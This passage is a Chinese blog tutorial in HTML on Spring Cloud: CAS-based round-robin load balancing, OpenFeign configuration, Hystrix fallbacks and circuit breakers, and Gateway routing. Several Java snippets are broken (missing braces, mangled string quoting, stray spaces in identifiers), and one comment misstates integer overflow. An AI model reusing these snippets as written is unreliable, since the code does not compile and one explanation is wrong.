href="#Ribbon的轮询算法底层使用了：CAS-自旋锁" class="headerlink" title="Ribbon的轮询算法底层使用了：CAS+自旋锁"></a>Ribbon的轮询算法底层使用了：<code>CAS+自旋锁</code></h4><blockquote><p>CAS（Compare-and-Swap），即比较并替换，java并发包中许多Atomic的类的底层原理都是CAS。</p><p>它的功能是判断内存中某个地址的值是否为预期值，如果是就改变成新值，整个过程具有原子性。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//实例</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CASDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">//初始值5</span></span><br><span class="line">          AtomicInteger atomicInteger = <span class="keyword">new</span> AtomicInteger(<span class="number">5</span>);</span><br><span class="line">  </span><br><span class="line">          <span class="comment">//和5比较,设置为10</span></span><br><span class="line">          System.out.println(<span class="string">"预期值:5,当前值:"</span>+atomicInteger);</span><br><span class="line">         System.out.println(<span class="string">"是否设置成功:"</span>+atomicInteger.compareAndSet(<span class="number">5</span>, <span class="number">10</span>));</span><br><span class="line">         <span class="comment">//和5比较,设置为15</span></span><br><span class="line">         System.out.println(<span class="string">"预期值:5,当前值:"</span>+atomicInteger);</span><br><span class="line">         System.out.println(<span class="string">"是否设置成功:"</span>+atomicInteger.compareAndSet(<span class="number">5</span>, <span class="number">15</span>));</span><br><span class="line"> </span><br><span class="line">         System.out.println(<span class="string">"当前值:"</span>+atomicInteger);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">预期值:<span class="number">5</span>,当前值:<span class="number">5</span></span><br><span class="line">是否设置成功:<span class="keyword">true</span></span><br><span class="line">预期值:<span class="number">5</span>,当前值:<span class="number">10</span></span><br><span class="line">是否设置成功:<span class="keyword">false</span></span><br><span class="line">当前值:<span class="number">10</span></span><br></pre></td></tr></table></figure><blockquote><p>所谓自旋：即循环进行CAS</p></blockquote><h4 id="手写轮询算法"><a href="#手写轮询算法" class="headerlink" title="手写轮询算法"></a>手写轮询算法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLb</span> <span class="keyword">implements</span> <span class="title">LoadBalancer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//原子整型</span></span><br><span class="line">    <span class="keyword">private</span> AtomicInteger atomicInteger = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getAndIncrement</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//自旋锁+CAS</span></span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">        <span class="keyword">int</span> next;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            current = <span class="keyword">this</span>.atomicInteger.get();</span><br><span class="line">            <span class="comment">//这里写法有点问题，MAX+1会变成-2^32</span></span><br><span class="line">            next = current &gt;= Integer.MAX_VALUE ? <span class="number">0</span> : current + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">while</span> (!<span class="keyword">this</span>.atomicInteger.compareAndSet(current, next));</span><br><span class="line">        System.out.println(<span class="string">"*****第几次访问，次数为next = "</span>+next);</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServiceInstance <span class="title">instances</span><span class="params">(List&lt;ServiceInstance&gt; serviceInstances)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> index = getAndIncrement() % serviceInstances.size();</span><br><span class="line">        <span class="keyword">return</span> serviceInstances.get(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h3><p>Feign是一个声明式WebService客户端。 使佣Feign能让编写Web Service客户端更加简单。它的使用方法是<code>定义一个服务接口然后在上面添加注解</code>。Feign也支持可拔插式的编码器和解码器。Spring Cloud对Feign进行了封装，使其支持了Spring MVC标准注解和HttpMessageConverters. Feign可以与Eureka和Ribbon组合使用以支持<strong>负载均衡</strong>。类似于<code>dubbo</code>。OpenFeign是支持SpringMVC的改进</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--openfeign--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka/</span></span><br></pre></td></tr></table></figure><blockquote><p>主启动类</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderFeignMain80</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(OrderFeignMain80<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>接口</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"CLOUD-PAYMENT-SERVICE"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PaymentFeignService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping</span>(value= <span class="string">"/payment/get/&#123;id&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> CommonResult <span class="title">getPaymentById</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span>Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="OpenFeign超时控制"><a href="#OpenFeign超时控制" class="headerlink" title="OpenFeign超时控制"></a>OpenFeign超时控制</h4><p>默认Feign客户端只等待一秒钟， 但是服务端处理需要超过1秒钟，导致Feign客户端不想等待了， 直接返回报错。为了避免这样的情况，有时候我们需要设置Feign客户端的超时控制。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#没置feign客端超时时间(openFeign默认支持ribbon)</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line"><span class="comment">#指的是建立连接后从服务器读取到可用资源所用的时间</span></span><br><span class="line">	<span class="attr">ReadTimeout:</span> <span class="number">5000</span></span><br><span class="line"><span class="comment">#指的是建立连接所用的时间，适用于网络状况正常的情况下两端连接所用的时间</span></span><br><span class="line">	<span class="attr">connectTimeout:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure><h4 id="OpenFeign日志级别"><a href="#OpenFeign日志级别" class="headerlink" title="OpenFeign日志级别"></a>OpenFeign日志级别</h4><p><code>NONE</code>:默认的,不显示任何日志;<br><code>BASIC</code>: 仅记录请求方法、URL、 响应状态码及执行时间;<br><code>HEADERS</code>:除了BASIC中定义的信息之外，还有请求和响应的头信息; .<br><code>FULL</code>: 除了HEADERS中定义的信息之外，还有请求和响应的正文及元数据。</p><blockquote><p>编写config.FeignConfig</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FeignConfig</span></span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    Logger.<span class="function">Level <span class="title">feignLoggerLevel</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Logger.Level.FULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">	<span class="attr">level:</span></span><br><span class="line">		<span class="comment"># feign日志以什么级别监控哪个接口</span></span><br><span class="line">		<span class="attr">com.atguigu.springcloud.service.PaymentFeignService:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure><h3 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h3><h4 id="Hystrix断路器"><a href="#Hystrix断路器" class="headerlink" title="Hystrix断路器"></a>Hystrix断路器</h4><p>​ 多个微服务之间调用的时候，假设微服务A调用微服务B和微服务C,微服务B和微服务C又调用其它的微服务,这就是所谓的”扇出”。如果扇出的链路上某个微服务的调用响应时间过长或者不可用，对微服务A的调用就会占用越来越多的系统资源，进而引起系统崩溃,所<br>谓的“雪崩效应”.<br>​ 对于高流量的应用来说，单一的后端依赖可能会导致所有服务器 上的所有资源都在几秒钟内饱和。比失败更糟糕的是,这些应用程序还<br>可能导致服务之间的延迟增加，备份队列，线程和其他系统资源紧张，导致整个系统发生更多的级联故障。这些都表示需要对故障和延迟进行隔离和管理，以便单个依赖关系的失败，不能取消整个应用程序或系统。</p><blockquote><p>Hystrix是一个用于处理分布式系统的延迟和容错的开源库， 在分布式系统里,许多依赖不可避免的会调用失败,比如超时、异常等，Hystrix能够保证在一个依赖出问题的情况下， 不会导致整体服务失败，避免级联故障,以提高分布式系统的弹性。</p><p>“断路器”本身是一 种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控(类似熔断保险丝) ,向调用方返回一个符合预期的、可处理的备选响应(FallBack) ，而不是长时间的等待或者抛出调用方无法处理的异常,这样就保证了服务调用方的线程不会被长时间、不必要地占用，从而避免了故障在分布式系统中的蔓延,乃至雪崩。</p></blockquote><h4 id="服务降级、熔断和限流"><a href="#服务降级、熔断和限流" class="headerlink" title="服务降级、熔断和限流"></a>服务降级、熔断和限流</h4><blockquote><p>降级相当于兜底的方案，而不是直接返回错误；熔断相当于保险丝；限流一般用在高并发和秒杀场景</p></blockquote><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-provider-hystrix-payment</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001:7001/eureka</span></span><br></pre></td></tr></table></figure><h4 id="JMeter测压"><a href="#JMeter测压" class="headerlink" title="JMeter测压"></a>JMeter测压</h4><p>100 QPS 循环200次，会出现明显延迟</p><h4 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h4><blockquote><p>检测到异常会调用fallback方法；服务降级一般加在<code>客户端</code></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_ok</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_ok, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"hhhhhh"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@HystrixCommand</span>(fallbackMethod = <span class="string">"paymentInfo_TimeOutHandler"</span>, commandProperties = &#123;</span><br><span class="line">            <span class="meta">@HystrixProperty</span>(name = <span class="string">"execution.isolation.thread.timeoutInMilliseconds"</span>, value = <span class="string">"3000"</span>)</span><br><span class="line">    &#125;) <span class="comment">//name里面是异常类型</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOut</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_TimeOut, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"耗时3秒"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">paymentInfo_TimeOutHandler</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"线程池： "</span></span><br><span class="line">                + Thread.currentThread().getName()</span><br><span class="line">                + <span class="string">"paymentInfo_TimeOutHandler, id"</span></span><br><span class="line">                + id</span><br><span class="line">                + <span class="string">"\t"</span></span><br><span class="line">                + <span class="string">"系统繁忙，请稍后再试"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>当有多个方法需要进行降级处理时，使用@<code>DefaultProperties</code>注解在类上，指明默认的奖及策略，此时使用@<code>HystrixCommand</code>注解的方法会调用该默认策略。</p></blockquote><h4 id="Feign-Fallback"><a href="#Feign-Fallback" class="headerlink" title="Feign Fallback"></a>Feign Fallback</h4><p>根据cloud-consumer-feign-hystrix-order80已经有的PaymentHystrixService接口，重新新建一个类(PaymentFallbackService)实现该接口， 统一为接口里面的方法进行异常处理PaymentFallbackService类实现PaymentFeignClientService接口。</p><blockquote><p>:star:这种思路相当于针对service接口层进行集中处理降级，由于service层接口使用Feign调用微服务，只需要编写集成这些接口的降级处理类，并绑定到该接口上即可。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient</span>(value = <span class="string">"CLOUD-PROVIDER-HYSTRIX-PAYMENT"</span> ,fallback = PaymentFallbackservice<span class="class">.<span class="keyword">class</span> )</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">interface</span> <span class="title">PaymentHystrixService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/payment/hystrix/ok/&#123;id&#125;"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> string paymentInfo_ <span class="title">OK</span> <span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="meta">@GetMapping</span>(<span class="string">" /payment/hystrix/timeout/&#123;id&#125;"</span> )</span><br><span class="line">    <span class="function"><span class="keyword">public</span> string payment Info_ <span class="title">TimeOut</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PaymentFallbackService</span> <span class="keyword">implements</span> <span class="title">PaymentHystrixService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> string <span class="title">paymentInfo_OK</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"-----PaymentFallbackService fa1l back-paymentInfo_ OK ,0(τ_ π)o"</span>;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> string <span class="title">paymentInfo_Timeout</span><span class="params">(Integer id)</span></span></span><br><span class="line"><span class="function">	return "-----PaymentFallbackservice fall back-paymentInfo_ TimeOut ,0<span class="params">(τ_ .π)</span>o"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="熔断机制"><a href="#熔断机制" class="headerlink" title="熔断机制"></a>熔断机制</h4><p>​ 熔断机制是应对雪崩效应的一种微服务链路保护机制。当扇出链路的某个微服务出错不可用或者响应时间太长时,会进行服务的降级,进而熔断该节点微服务的调用，快速返回错误的响应信息。当检测到该节点微服务调用响应正常后,恢复调用链路。在Spring Cloud框架里,熔断机制通过Hystrix实现。Hystrix会监控微服务间调用的状况，当失败的调用到一定阈值,缺省是5秒内20次调用失败,就会启动熔断机制。熔断机制的注解是@HystrixCommand.</p><h5 id="熔断案例"><a href="#熔断案例" class="headerlink" title="熔断案例"></a>熔断案例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//=====服务熔断</span></span><br><span class="line"><span class="meta">@HystrixCommand</span>( fallbackMethod = <span class="string">"paymentCircuitBreaker_fallback"</span> , commandproperties = &#123;</span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.enabled"</span> ,value = <span class="string">"true"</span>),<span class="comment">// 是否开启断路器</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.requestVolumeThreshold"</span> ,value = <span class="string">"10"</span>),<span class="comment">// 请求次数</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.sleepwindowInMilliseconds"</span> ,value = <span class="string">"10000"</span>), <span class="comment">//时间窗口期,即从断开进入到半开的等待时间</span></span><br><span class="line"><span class="meta">@HystrixProperty</span>(name = <span class="string">"circuitBreaker.errorThresholdPercentage"</span> ,value = <span class="string">"60"</span>),<span class="comment">// 失败率达到多少后跳闻</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">paymentCircuitBreaker</span> <span class="params">(@Pathvariable(<span class="string">"id"</span>)</span> Integer id)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(id &lt; <span class="number">0</span>)</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(******id 不能负数<span class="string">");</span></span><br><span class="line"><span class="string">    String serialNumber = Idutil.simpleUUID();</span></span><br><span class="line"><span class="string">    return Thread.current.Thread().getName()+"</span>\t<span class="string">"+"</span>调用成功，流水号:<span class="string">"+ 				serialNumber;</span></span><br><span class="line"><span class="string">public String paymentCircuitBreaker_fallback(@PathVariable("</span>id<span class="string">") Integer id)&#123;</span></span><br><span class="line"><span class="string">    return "</span>id不能负数，请稍后再试，/(ToT)/~~ id:<span class="string">"+id;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[熔断] --&gt;|触发| B[降级]</span><br></pre></td></tr></table></figure><h3 id="服务网关"><a href="#服务网关" class="headerlink" title="服务网关"></a>服务网关</h3><h4 id="GatWay"><a href="#GatWay" class="headerlink" title="GatWay"></a>GatWay</h4><p>SpringCloud Gateway作为Spring Cloud生态系统中的网关,目标是替代Zuul,在Spring Cloud 2.0以上版本中，没有对新版本的Zuu1 2.上最新高性能版本进行集成，仍然还是使用的Zuul 1.x非Reactor模式的老版本。而为了提升网关的性能，SpringCloud Gateway是基于WebFlux框架实现的，而WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty。</p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200718090110820.png" alt="image-20200718090110820" style="zoom:80%"><h4 id="Route"><a href="#Route" class="headerlink" title="Route"></a>Route</h4><blockquote><p>路由是构建网关的基本模块，它由ID，目标URI, 一系列的断言和过滤器组成，如果断言为true则匹配该路由</p></blockquote><h4 id="Predicate（断言）"><a href="#Predicate（断言）" class="headerlink" title="Predicate（断言）"></a>Predicate（断言）</h4><blockquote><p>开发人员可以匹配HTTP请求中的所有内容(例如请求头或请求参数)， 如果请求与断言相匹配则进行路由</p></blockquote><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><blockquote><p>指的是Spring框架中GatewayFilter的实例，使用过滤器，可以在请求被路由前或者之后对请求进行修改</p></blockquote><p>:star:Filter在”pre” 类型的过滤器可以做<code>参数校验、权限校验、流量监控、日志输出、协议转换</code>等，在”post” 类型的过滤器中可以做<code>响应内容、响应头的修改，旧志的输出，流量监控</code>等有着非常重要的作用。</p><h4 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h4><blockquote><p>POM，注意要排除web依赖</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--gateway--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML，注意<code>- Path</code>的P是大写</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#路由的ID，没有固定规则但要求唯-，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh2</span> <span class="comment">#路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">http://localhost:8001</span> <span class="comment">#匹配后提供服务的路由地址</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/lb/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><p>:star: 实际场景下，网关将指定端口拦截并路由到指定ip+内部端口，此内部端口会添加防火墙</p><blockquote><p>硬编码写法</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GatewayConfig</span></span></span><br><span class="line"><span class="class">        @<span class="title">Bean</span></span></span><br><span class="line"><span class="class">        <span class="title">public</span> <span class="title">RouteLocator</span> <span class="title">customRouteLocator</span>( <span class="title">RouteLocatorBuilder</span> <span class="title">routeLocatorBuilder</span>)</span></span><br><span class="line"><span class="class">        <span class="title">RouteLocatorBuilder</span>.<span class="title">Builder</span> <span class="title">routes</span> </span>= routeLocatorBuilder.routes(); </span><br><span class="line"></span><br><span class="line">        routes.route(<span class="string">"path_route_atguigu"</span>, r -&gt; r.path(<span class="string">"/guonei"</span> ).uri(<span class="string">"http://news . baidu. com/ guonei"</span>)).build();</span><br><span class="line">        <span class="keyword">return</span> routes.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="配置动态路由"><a href="#配置动态路由" class="headerlink" title="配置动态路由"></a>配置动态路由</h4><blockquote><p>负载均衡使用的Ribbon</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9527</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">cloud-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line"></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">payment_routh</span> <span class="comment">#路由的ID，没有固定规则但要求唯-，建议配合服务名</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://cloud-payment-service</span> <span class="comment">#路由的微服务名称，lb是负载均衡</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/payment/get/**</span> <span class="comment">#断言，路径相匹配的进行路由</span></span><br><span class="line"><span class="comment">#        - id: payment_routh2 #路由的ID，没有固定规则但要求唯一，建议配合服务名</span></span><br><span class="line"><span class="comment">#          uri: lb://cloud-payment-service #匹配后提供服务的路由地址</span></span><br><span class="line"><span class="comment">#          predicates:</span></span><br><span class="line"><span class="comment">#            - Path=/payment/lb/** #断言，路径相匹配的进行路由</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment">#开启冲注册中心动态创建路由的功能，利用微服务进行路由</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">cloud-gateway-service</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://eureka7001.com:7001/eureka</span></span><br></pre></td></tr></table></figure><h4 id="常用的predicates"><a href="#常用的predicates" class="headerlink" title="常用的predicates"></a>常用的predicates</h4><p>GateWay有多种断言，包含对时间、Cookie、Header、Host、Path、Query等多种条件的匹配，参数为名称+正则表达式</p><h4 id="Filter的使用：主要是自定义过滤器"><a href="#Filter的使用：主要是自定义过滤器" class="headerlink" 